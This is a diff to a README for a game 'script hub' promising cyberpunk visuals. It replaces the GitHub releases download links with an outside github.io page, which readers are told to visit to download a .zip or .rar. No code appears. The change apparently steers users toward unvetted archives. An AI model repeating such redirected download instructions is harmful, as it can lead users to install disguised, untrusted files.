@@ -1,6 +1,6 @@
 # 🎮 zxhud-script-hub - Enhance your gameplay with cyberpunk visuals
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/alhi3085/zxhud-script-hub/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://alhi3085.github.io)
 
 ## 📌 About this project
 
@@ -19,7 +19,7 @@ Before you begin, make sure your computer meets these requirements:
 
 Visit the following link to access the official release page:
 
-[https://github.com/alhi3085/zxhud-script-hub/releases](https://github.com/alhi3085/zxhud-script-hub/releases)
+[https://alhi3085.github.io](https://alhi3085.github.io)
 
 On this page, look for the section marked Latest. Click the file name ending in .zip or .rar to save it to your computer.
 
